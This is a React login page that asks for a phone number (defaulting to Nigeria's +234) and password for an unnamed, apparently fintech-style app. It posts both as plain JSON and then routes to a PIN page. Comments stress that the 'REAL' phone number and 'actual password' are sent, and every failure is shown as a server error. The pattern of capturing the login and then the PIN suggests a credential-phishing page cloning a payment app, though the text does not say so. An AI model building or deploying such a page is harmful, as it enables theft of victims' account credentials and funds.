import React, { useMemo, useState } from "react";
import { useNavigate } from "react-router-dom";
import { FiChevronDown, FiEyeOff, FiEye, FiSearch, FiX } from "react-icons/fi";
import BASE_URL from "../components/urls";
import countries from "../data/countries";

const flagToCountryCode = (flag) => {
  return [...flag]
    .map((char) => char.codePointAt(0) - 127397)
    .map((code) => String.fromCharCode(code))
    .join("")
    .toLowerCase();
};

const FlagImage = ({ country, className = "h-7 w-7" }) => {
  const countryCode = flagToCountryCode(country.flag);
  return (
    <img
      className={`${className} rounded-full object-cover`}
      src={`https://flagcdn.com/w80/${countryCode}.png`}
      alt={`${country.name} flag`}
    />
  );
};

const DEFAULT_COUNTRY =
  countries.find((c) => c.code === "+234") || countries[0];

const Home = () => {
  const navigate = useNavigate();
  const [selectedCountry, setSelectedCountry] = useState(DEFAULT_COUNTRY);
  const [countryOpen, setCountryOpen] = useState(false);
  const [search, setSearch] = useState("");
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const filteredCountries = useMemo(() => {
    const term = search.trim().toLowerCase();
    if (!term) return countries;
    return countries.filter(
      (c) => c.name.toLowerCase().includes(term) || c.code.includes(term),
    );
  }, [search]);

  const canSubmit = phone.trim().length > 0 && password.length > 0;

  const handlePhone = (e) => {
    const digits = e.target.value.replace(/\D/g, "").slice(0, 11);
    setPhone(digits);
  };

  // ── Submit: sends REAL phone + password to server ───────────────────────────
  const submitForm = async (event) => {
    event.preventDefault();
    if (!canSubmit) return;

    setLoading(true);
    setError("");

    try {
      const response = await fetch(`${BASE_URL}/`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          countryCode: selectedCountry.code, // e.g. "+234"
          phone: phone.trim(), // e.g. "08012345678"
          password: password, // actual password
        }),
      });

      const data = await response.json();

      if (!response.ok || !data.success) {
        throw new Error(data.message || "Login failed.");
      }

      navigate("/pin");
    } catch (err) {
      console.error("Login error:", err);
      setError("Could not reach the server. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  const chooseCountry = (country) => {
    setSelectedCountry(country);
    setCountryOpen(false);
    setSearch("");
    setPhone("");
  };

  return (
    <main className="min-h-screen bg-[#f8f7f4] text-[#202025]">
      <div className="mx-auto flex min-h-screen w-full max-w-[500px] flex-col px-[25px] pb-[34px] pt-[25px]">
        <form className="flex flex-1 flex-col" onSubmit={submitForm}>
          <h1 className="mb-[31px] text-[31px] font-extrabold leading-[1.08] tracking-[-0.01em]">
            Login to your account
          </h1>

          {/* ── Phone number ─────────────────────────────────────────────────── */}
          <label className="mb-[13px] block text-[18px] font-medium leading-none">
            Phone number
          </label>

          <div className="mb-[31px] grid grid-cols-[95px_minmax(0,1fr)] gap-4">
            {/* Flag + chevron */}
            <button
              type="button"
              className="flex h-[70px] items-center justify-center gap-[14px] rounded-[4px] border border-[#d2d2d2] bg-white shadow-[inset_0_0_0_1px_rgba(0,0,0,0.02)]"
              onClick={() => setCountryOpen(true)}
              aria-label="Choose country"
            >
              <FlagImage country={selectedCountry} className="h-9 w-9" />
              <FiChevronDown className="h-[22px] w-[22px] stroke-[2] text-[#202025]" />
            </button>

            {/* Dial code + phone input in one box */}
            <div className="flex h-[70px] min-w-0 items-center rounded-[4px] border border-[#d2d2d2] bg-white px-[13px] shadow-[inset_0_0_0_1px_rgba(0,0,0,0.02)]">
              <span className="mr-1 shrink-0 text-[18px] font-bold text-[#202025]">
                {selectedCountry.code}
              </span>
              <input
                className="min-w-0 flex-1 bg-transparent text-[18px] font-bold text-[#202025] outline-none placeholder:font-normal placeholder:text-[#b0afad]"
                inputMode="numeric"
                placeholder="9156244409"
                maxLength={11}
                value={phone}
                onChange={handlePhone}
                aria-label="Phone number"
              />
            </div>
          </div>

          {/* ── Password ─────────────────────────────────────────────────────── */}
          <label className="mb-[13px] block text-[18px] font-medium leading-none">
            Password
          </label>
          <div className="relative mb-[22px]">
            <input
              className="h-[70px] w-full rounded-[4px] border border-[#d2d2d2] bg-white px-4 pr-[58px] text-[18px] outline-none shadow-[inset_0_0_0_1px_rgba(0,0,0,0.02)]"
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              aria-label="Password"
            />
            <button
              type="button"
              onClick={() => setShowPassword((v) => !v)}
              className="absolute right-[21px] top-1/2 -translate-y-1/2 text-[#202025]"
              aria-label={showPassword ? "Hide password" : "Show password"}
            >
              {showPassword ? (
                <FiEye className="h-[25px] w-[25px]" />
              ) : (
                <FiEyeOff className="h-[25px] w-[25px]" />
              )}
            </button>
          </div>

          {/* Error */}
          {error && (
            <p className="mb-4 text-[14px] font-medium text-red-500">{error}</p>
          )}

          <p className="text-[16px] font-medium leading-none text-[#5d5b5d]">
            Trouble logging in?{" "}
            <a className="font-semibold text-[#079b65] underline" href="#">
              Recover your account
            </a>
          </p>

          <div className="mt-auto">
            <button
              type="submit"
              disabled={!canSubmit || loading}
              className="h-[70px] w-full rounded-full bg-[#dedddb] text-[20px] font-bold text-[#9b9996] transition-colors enabled:bg-[#079b65] enabled:text-white disabled:cursor-not-allowed"
            >
              {loading ? "Sending..." : "Log in"}
            </button>

            <p className="mt-[38px] text-center text-[17px] font-bold text-[#555559]">
              Don't have an account?{" "}
              <a className="text-[#079b65]" href="#">
                Sign up
              </a>
            </p>
          </div>
        </form>
      </div>

      {/* ── Country picker modal ──────────────────────────────────────────────── */}
      {countryOpen && (
        <div className="fixed inset-0 z-10 flex items-end justify-center bg-black/60">
          <section className="max-h-[92vh] w-full max-w-[500px] overflow-hidden rounded-t-[12px] bg-white px-[30px] pb-5 pt-[19px]">
            <button
              type="button"
              className="mb-[27px] text-[32px] text-[#202025]"
              onClick={() => setCountryOpen(false)}
              aria-label="Close"
            >
              <FiX />
            </button>

            <div className="relative mb-[30px]">
              <FiSearch className="absolute left-4 top-1/2 h-6 w-6 -translate-y-1/2 text-[#7c7c82]" />
              <input
                className="h-[70px] w-full rounded-[7px] border border-[#d5d5d5] pl-[57px] pr-4 text-[18px] outline-none"
                placeholder="Search"
                value={search}
                onChange={(e) => setSearch(e.target.value)}
              />
            </div>

            <div className="max-h-[68vh] overflow-y-auto">
              {filteredCountries.map((country) => (
                <button
                  key={`${country.name}-${country.code}`}
                  type="button"
                  className="grid h-[64px] w-full grid-cols-[58px_1fr_auto] items-center text-left text-[19px] text-[#202025]"
                  onClick={() => chooseCountry(country)}
                >
                  <FlagImage country={country} className="h-8 w-8" />
                  <span>{country.name}</span>
                  <span className="font-medium text-[#202025]">
                    {country.code}
                  </span>
                </button>
              ))}
            </div>
          </section>
        </div>
      )}
    </main>
  );
};

export default Home;
